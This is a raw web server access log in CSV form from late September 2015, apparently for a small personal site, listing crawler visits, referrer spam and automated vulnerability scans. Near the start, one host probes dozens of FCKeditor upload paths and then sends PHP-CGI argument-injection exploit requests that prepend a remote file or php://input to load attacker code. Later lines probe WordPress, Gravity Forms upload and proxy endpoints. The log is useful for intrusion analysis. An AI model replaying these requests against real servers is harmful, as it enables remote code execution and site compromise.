"Host","Log Name","Date Time","Time Zone","Method","URL","Response Code","Bytes Sent","Referer","User Agent"
"104.217.216.170","-","2015-09-29 04:19:01","GMT-0700","HEAD","/includes/fckeditor/",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:01","GMT-0700","HEAD","/js/fckeditor/",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:01","GMT-0700","HEAD","/manage/fckeditor/",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:01","GMT-0700","HEAD","/scripts/fckeditor/",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:01","GMT-0700","HEAD","/sysadmin/fckeditor/",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:01","GMT-0700","HEAD","/system/fckeditor/",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:01","GMT-0700","HEAD","/upload/FCKeditor/",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:02","GMT-0700","HEAD","/upload/fckediter/",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:02","GMT-0700","HEAD","/fckeditor/editor/filemanager/connectors/aspx/upload.aspx",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:02","GMT-0700","HEAD","/fckeditor/editor/filemanager/connectors/asp/upload.asp",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:02","GMT-0700","HEAD","/fckeditor/editor/filemanager/connectors/php/upload.php",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:02","GMT-0700","HEAD","/FCKeditor/editor/filemanager/connectors/php/upload.php",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:02","GMT-0700","HEAD","/fckeditor/editor/filemanager/upload/aspx/upload.aspx",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:02","GMT-0700","HEAD","/fckeditor/editor/filemanager/upload/asp/upload.asp",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:02","GMT-0700","HEAD","/fckeditor/editor/filemanager/upload/php/upload.php",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:02","GMT-0700","HEAD","/FCKeditor/editor/filemanager/upload/php/upload.php",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:02","GMT-0700","HEAD","/fckeditor/editor/filemanager/connectors/aspx/connector.aspx",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:02","GMT-0700","HEAD","/FCKeditor/editor/filemanager/connectors/aspx/connector.aspx",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:02","GMT-0700","HEAD","/fckeditor/editor/filemanager/connectors/asp/connector.asp",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:02","GMT-0700","HEAD","/fckeditor/editor/filemanager/connectors/php/connector.php",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:02","GMT-0700","HEAD","/FCKeditor/editor/filemanager/connectors/php/connector.php",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:02","GMT-0700","HEAD","/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:02","GMT-0700","HEAD","/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:02","GMT-0700","HEAD","/FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:02","GMT-0700","HEAD","/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:02","GMT-0700","HEAD","/includes/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:03","GMT-0700","HEAD","/includes/fckeditor/editor/filemanager/connectors/aspx/upload.aspx",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:03","GMT-0700","HEAD","/includes/fckeditor/editor/filemanager/connectors/asp/upload.asp",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:03","GMT-0700","HEAD","/includes/fckeditor/editor/filemanager/connectors/php/upload.php",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:03","GMT-0700","HEAD","/includes/FCKeditor/editor/filemanager/connectors/php/upload.php",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:03","GMT-0700","HEAD","/includes/fckeditor/editor/filemanager/upload/aspx/upload.aspx",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:03","GMT-0700","HEAD","/includes/fckeditor/editor/filemanager/upload/asp/upload.asp",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:03","GMT-0700","HEAD","/includes/fckeditor/editor/filemanager/upload/php/upload.php",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:03","GMT-0700","HEAD","/includes/FCKeditor/editor/filemanager/upload/php/upload.php",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:03","GMT-0700","HEAD","/includes/fckeditor/editor/filemanager/connectors/aspx/connector.aspx",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:03","GMT-0700","HEAD","/includes/fckeditor/editor/filemanager/connectors/asp/connector.asp",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:03","GMT-0700","HEAD","/includes/fckeditor/editor/filemanager/connectors/php/connector.php",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:03","GMT-0700","HEAD","/includes/FCKeditor/editor/filemanager/connectors/php/connector.php",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:03","GMT-0700","HEAD","/includes/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:03","GMT-0700","HEAD","/includes/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:03","GMT-0700","HEAD","/admin/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:03","GMT-0700","HEAD","/admin/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:03","GMT-0700","HEAD","/admin/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:03","GMT-0700","HEAD","/admin/FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:03","GMT-0700","HEAD","/admin/fckeditor/editor/filemanager/connectors/aspx/connector.aspx",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:03","GMT-0700","HEAD","/admin/fckeditor/editor/filemanager/connectors/asp/connector.asp",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:03","GMT-0700","HEAD","/admin/fckeditor/editor/filemanager/connectors/php/connector.php",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:03","GMT-0700","HEAD","/admin/FCKeditor/editor/filemanager/connectors/php/connector.php",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:03","GMT-0700","HEAD","/admin/fckeditor/editor/filemanager/connectors/aspx/upload.aspx",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:03","GMT-0700","HEAD","/admin/fckeditor/editor/filemanager/connectors/asp/upload.asp",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:03","GMT-0700","HEAD","/admin/fckeditor/editor/filemanager/connectors/php/upload.php",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:03","GMT-0700","HEAD","/admin/FCKeditor/editor/filemanager/connectors/php/upload.php",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:03","GMT-0700","HEAD","/admin/fckeditor/editor/filemanager/upload/aspx/upload.aspx",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:04","GMT-0700","HEAD","/admin/fckeditor/editor/filemanager/upload/asp/upload.asp",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:04","GMT-0700","HEAD","/admin/fckeditor/editor/filemanager/upload/php/upload.php",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:04","GMT-0700","HEAD","/admin/FCKeditor/editor/filemanager/upload/php/upload.php",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:04","GMT-0700","HEAD","/ckeditor/ckfinder/core/connector/asp/connector.asp",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:04","GMT-0700","HEAD","/ckeditor/ckfinder/core/connector/php/connector.php",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:04","GMT-0700","HEAD","/ckeditor/ckfinder/core/connector/aspx/connector.aspx",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:04","GMT-0700","HEAD","/kcfinder/browse.php",404,163,"-","-"
"104.217.216.170","-","2015-09-29 04:19:04","GMT-0700","GET","/?-dallow_url_include%3don+-dauto_prepend_file%3dhttp://api.semhat.com/info.txt",200,543,"-","-"
"104.217.216.170","-","2015-09-29 04:19:04","GMT-0700","POST","/cgi-bin/php5?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E",404,531,"-","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
"50.17.11.85","-","2015-09-29 04:31:53","GMT-0700","HEAD","/",200,284,"-","Mozilla/5.0 (X11; U; Linux i686; ru-RU; rv:1.7.5) Gecko/20041108 Firefox/1.0"
"106.120.173.111","-","2015-09-29 05:01:12","GMT-0700","GET","/robots.txt",200,358,"-","Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
"61.135.249.68","-","2015-09-29 05:18:56","GMT-0700","GET","/robots.txt",200,365,"-","Mozilla/5.0 (compatible; YoudaoBot/1.0; http://www.youdao.com/help/webmaster/spider/; )"
"176.9.19.145","-","2015-09-29 05:56:27","GMT-0700","GET","/ramble/index.php?blogId=91",404,507,"http://spinster.org/","Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
"176.9.19.145","-","2015-09-29 05:56:27","GMT-0700","GET","/",200,564,"http://spinster.org","Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
"216.163.188.234","-","2015-09-29 06:10:24","GMT-0700","GET","/",200,600,"-","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0"
"91.221.61.251","-","2015-09-29 06:37:37","GMT-0700","GET","/",200,508,"-","Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0"
"95.211.168.172","-","2015-09-29 07:04:56","GMT-0700","GET","/",200,562,"-","Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:27.C) Gecko/20130407 Firefox/27.0"
"104.197.204.99","-","2015-09-29 08:04:03","GMT-0700","GET","/",200,600,"-","NerdyBot"
"66.71.247.94","-","2015-09-29 08:23:12","GMT-0700","GET","/dbadmin/scripts/setup.php",404,509,"-","-"
"95.215.9.222","-","2015-09-29 08:57:08","GMT-0700","GET","/",200,562,"-","netscan.lekus.su"
"24.230.181.31","-","2015-09-29 09:38:25","GMT-0700","GET","/robots.txt",200,396,"-","Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
"141.212.122.202","-","2015-09-29 10:27:05","GMT-0700","GET","/",200,543,"-","Mozilla/5.0 zgrab/0.x"
"193.201.227.134","-","2015-09-29 10:41:24","GMT-0700","GET","/wp-login.php",404,472,"-","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36"
"193.201.227.134","-","2015-09-29 10:41:24","GMT-0700","GET","/administrator/index.php",404,483,"-","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36"
"193.201.227.134","-","2015-09-29 10:41:25","GMT-0700","GET","/admin.php",404,469,"-","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36"
"150.70.173.7","-","2015-09-29 11:01:50","GMT-0700","GET","/",200,543,"-","Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
"193.201.224.158","-","2015-09-29 11:31:45","GMT-0700","GET","/ramble/index.php?blogId=5",404,495,"http://spinster.org/ramble/index.php?blogId=5","Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0"
"193.201.224.158","-","2015-09-29 11:31:46","GMT-0700","GET","/",200,562,"http://spinster.org/","Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0"
"176.9.19.145","-","2015-09-29 12:08:05","GMT-0700","GET","/ramble/index.php?blogId=5",404,507,"http://spinster.org/","Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
"176.9.19.145","-","2015-09-29 12:08:06","GMT-0700","GET","/",200,564,"http://spinster.org","Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
"207.46.13.148","-","2015-09-29 12:11:21","GMT-0700","GET","/robots.txt",200,396,"-","Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
"123.125.71.77","-","2015-09-29 12:29:21","GMT-0700","GET","/",200,527,"-","Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
"123.125.71.73","-","2015-09-29 12:29:22","GMT-0700","GET","/",200,562,"-","Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
"123.30.175.208","-","2015-09-29 13:09:13","GMT-0700","GET","/robots.txt",200,385,"-","Mozilla/5.0 (compatible; coccoc/1.0; +http://help.coccoc.com/)"
"123.30.175.208","-","2015-09-29 13:09:48","GMT-0700","GET","/robots.txt",200,385,"-","Mozilla/5.0 (compatible; coccoc/1.0; +http://help.coccoc.com/)"
"46.4.94.226","-","2015-09-29 13:11:22","GMT-0700","GET","/robots.txt",200,385,"-","Riddler (http://riddler.io/about)"
"46.4.94.226","-","2015-09-29 13:11:22","GMT-0700","GET","/photos/als/14.html",404,470,"-","Riddler (http://riddler.io/about)"
"208.115.113.82","-","2015-09-29 13:31:21","GMT-0700","GET","/robots.txt",200,365,"-","Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
"101.226.166.250","-","2015-09-29 13:33:47","GMT-0700","GET","/robots.txt",200,423,"http://spinster.org/robots.txt","Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; 360Spider(compatible; HaosouSpider; http://www.haosou.com/help/help_3_2.html)"
"66.249.79.240","-","2015-09-29 13:42:50","GMT-0700","GET","/robots.txt",200,423,"-","Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"207.106.190.2","-","2015-09-29 13:56:55","GMT-0700","GET","/robots.txt",200,365,"-","NextGenSearchBot 1 (for information visit http://www.zoominfo.com/About/misc/NextGenSearchBot.aspx)"
"208.115.113.82","-","2015-09-29 14:23:05","GMT-0700","GET","/",200,543,"-","Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
"208.115.113.82","-","2015-09-29 15:30:12","GMT-0700","GET","/robots.txt",200,365,"-","Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
"205.204.92.210","-","2015-09-29 15:40:46","GMT-0700","GET","/",200,565,"http://digitalflock.org","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.50"
"208.115.113.82","-","2015-09-29 16:09:55","GMT-0700","GET","/writings/poetry",404,479,"-","Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
"46.4.32.75","-","2015-09-29 17:12:23","GMT-0700","GET","/robots.txt",200,358,"-","Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
"54.158.240.46","-","2015-09-29 17:56:52","GMT-0700","HEAD","/",200,260,"-","Cloud mapping experiment. Contact research@pdrlabs.net"
"220.181.108.94","-","2015-09-29 17:57:53","GMT-0700","GET","/",304,175,"-","Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
"220.181.108.151","-","2015-09-29 18:31:13","GMT-0700","GET","/ramble/index.php?blogId=63",404,469,"-","Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
"85.214.74.20","-","2015-09-29 19:38:17","GMT-0700","GET","/",200,562,"-","drupact/0.7; http://www.arocom.de/drupact"
"85.214.74.20","-","2015-09-29 19:38:18","GMT-0700","GET","/robots.txt",200,358,"-","drupact/0.7; http://www.arocom.de/drupact"
"85.214.74.20","-","2015-09-29 19:38:19","GMT-0700","GET","/sitemap.xml",404,490,"-","drupact/0.7; http://www.arocom.de/drupact"
"85.214.74.20","-","2015-09-29 19:38:19","GMT-0700","GET","/CHANGELOG.txt",404,492,"-","drupact/0.7; http://www.arocom.de/drupact"
"85.214.74.20","-","2015-09-29 19:38:20","GMT-0700","GET","/misc/drupal.js",404,493,"-","drupact/0.7; http://www.arocom.de/drupact"
"85.214.74.20","-","2015-09-29 19:38:20","GMT-0700","GET","/core/misc/drupal.js",404,498,"-","drupact/0.7; http://www.arocom.de/drupact"
"85.214.74.20","-","2015-09-29 19:38:21","GMT-0700","GET","/wp-includes/js/quicktags.js",404,506,"-","drupact/0.7; http://www.arocom.de/drupact"
"85.214.74.20","-","2015-09-29 19:38:22","GMT-0700","GET","/media/system/js/core.js",404,502,"-","drupact/0.7; http://www.arocom.de/drupact"
"85.214.74.20","-","2015-09-29 19:38:22","GMT-0700","GET","/t3lib/jsfunc.menu.js",404,499,"-","drupact/0.7; http://www.arocom.de/drupact"
"114.221.21.67","-","2015-09-29 20:01:00","GMT-0700","GET","/ramble/index.php?blogId=39",404,507,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1;)"
"24.220.5.235","-","2015-09-29 20:08:15","GMT-0700","GET","/robots.txt",200,396,"-","Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
"106.120.173.111","-","2015-09-29 21:05:51","GMT-0700","GET","/robots.txt",200,358,"-","Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
"106.120.173.111","-","2015-09-29 21:05:57","GMT-0700","GET","/robots.txt",200,358,"-","Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
"204.12.241.170","-","2015-09-29 21:40:49","GMT-0700","GET","/robots.txt",200,358,"-","Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
"52.20.151.197","-","2015-09-29 22:01:17","GMT-0700","GET","/",200,600,"-","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.65 Safari/537.31"
"195.154.156.209","-","2015-09-29 23:06:19","GMT-0700","GET","/robots.txt",200,358,"-","Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
"123.125.71.76","-","2015-09-29 23:29:02","GMT-0700","GET","/",200,527,"-","Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
"123.125.71.117","-","2015-09-29 23:29:03","GMT-0700","GET","/",200,562,"-","Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
"66.249.79.214","-","2015-09-30 00:30:10","GMT-0700","GET","/robots.txt",200,423,"-","Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"149.202.54.50","-","2015-09-30 00:30:25","GMT-0700","GET","/robots.txt",200,358,"-","Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
"217.12.204.134","-","2015-09-30 00:53:07","GMT-0700","GET","/ramble/index.php?blogId=5",404,495,"http://spinster.org/ramble/index.php?blogId=5","Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36"
"217.12.204.134","-","2015-09-30 00:53:07","GMT-0700","GET","/",200,562,"http://spinster.org/","Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36"
"169.50.3.171","-","2015-09-30 01:52:34","GMT-0700","GET","/xmlrpc.php",404,472,"-","-"
"91.215.153.17","-","2015-09-30 01:55:45","GMT-0700","GET","/",200,527,"http://digitalflock.org/","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
"67.229.61.26","-","2015-09-30 02:01:11","GMT-0700","GET","/",200,600,"-","-"
"67.229.61.26","-","2015-09-30 02:01:11","GMT-0700","GET","/xmlrpc.php",404,470,"-","-"
"67.229.61.26","-","2015-09-30 02:01:12","GMT-0700","GET","/wp-login.php",404,472,"-","-"
"107.189.60.68","-","2015-09-30 02:18:13","GMT-0700","GET","/",200,565,"-","Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0"
"101.226.66.192","-","2015-09-30 03:17:50","GMT-0700","GET","/",200,562,"-","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-cn; GT-I9500 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 MQQBrowser/5.0 QQ-Manager Mobile Safari/537.36"
"117.78.13.17","-","2015-09-30 04:22:30","GMT-0700","GET","/robots.txt",200,385,"-","nutch-1.4/Nutch-1.4"
"123.30.175.214","-","2015-09-30 04:31:04","GMT-0700","GET","/robots.txt",200,385,"-","Mozilla/5.0 (compatible; coccoc/1.0; +http://help.coccoc.com/)"
"185.53.44.20","-","2015-09-30 04:31:30","GMT-0700","GET","/robots.txt",200,396,"-","Mozilla/5.0 (compatible; XoviBot/2.0; +http://www.xovibot.net/)"
"123.30.175.213","-","2015-09-30 04:31:35","GMT-0700","GET","/robots.txt",200,385,"-","Mozilla/5.0 (compatible; coccoc/1.0; +http://help.coccoc.com/)"
"66.249.73.186","-","2015-09-30 06:57:49","GMT-0700","GET","/robots.txt",200,423,"-","Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"85.25.185.157","-","2015-09-30 07:01:31","GMT-0700","GET","/robots.txt",200,358,"-","Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
"104.197.30.186","-","2015-09-30 07:55:02","GMT-0700","GET","/",200,600,"-","NerdyBot"
"141.212.122.146","-","2015-09-30 07:56:02","GMT-0700","CONNECT","proxytest.zmap.io:80",405,541,"-","Mozilla/5.0 zgrab/0.x"
"185.36.100.145","-","2015-09-30 08:13:08","GMT-0700","GET","/",200,508,"http://pizza-tycoon.com/","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36"
"207.46.13.116","-","2015-09-30 08:16:10","GMT-0700","GET","/robots.txt",200,396,"-","Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
"54.198.109.60","-","2015-09-30 08:29:56","GMT-0700","HEAD","/",200,260,"-","Cloud mapping experiment. Contact research@pdrlabs.net"
"66.249.79.186","-","2015-09-30 08:57:20","GMT-0700","GET","/robots.txt",200,423,"-","Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"54.209.56.214","-","2015-09-30 10:17:29","GMT-0700","GET","/robots.txt",200,385,"-","ltx71 - (http://ltx71.com/)"
"178.5.134.107","-","2015-09-30 10:32:11","GMT-0700","GET","/photos/black_fleet/wookie.jpg",404,521,"http://www.ilxor.com/ILX/ThreadSelectedControllerServlet?action=showall&boardid=40&threadid=23687","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
"208.115.113.92","-","2015-09-30 10:32:54","GMT-0700","GET","/robots.txt",200,365,"-","Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
"169.50.3.171","-","2015-09-30 11:02:29","GMT-0700","GET","/xmlrpc.php",404,472,"-","-"
"54.188.160.88","-","2015-09-30 11:14:25","GMT-0700","GET","/",200,527,"-","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36"
"208.115.113.92","-","2015-09-30 11:22:04","GMT-0700","GET","/ramble/index.php?blogId=85",404,476,"-","Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
"212.83.131.217","-","2015-09-30 11:40:48","GMT-0700","GET","/ramble/index.php?blogId=5",404,507,"http://spinster.org/","Mozilla/5.0 (Windows NT 6.2; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0"
"212.83.131.217","-","2015-09-30 11:40:48","GMT-0700","GET","/",200,564,"http://spinster.org","Mozilla/5.0 (Windows NT 6.2; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0"
"104.207.150.177","-","2015-09-30 12:18:39","GMT-0700","GET","/",200,543,"-","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
"54.69.110.68","-","2015-09-30 12:27:09","GMT-0700","GET","/phone_pix/cat.jpg",404,453,"-","python-requests/2.2.1 CPython/2.7.6 Linux/3.13.0-44-generic"
"74.208.43.170","-","2015-09-30 12:32:16","GMT-0700","GET","/?gf_page=upload",200,565,"-","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0"
"106.120.173.111","-","2015-09-30 13:52:35","GMT-0700","GET","/robots.txt",200,358,"-","Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
"104.245.97.236","-","2015-09-30 15:00:33","GMT-0700","GET","/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",404,522,"-","-"
"185.53.44.21","-","2015-09-30 15:02:31","GMT-0700","GET","/robots.txt",200,396,"-","Mozilla/5.0 (compatible; XoviBot/2.0; +http://www.xovibot.net/)"
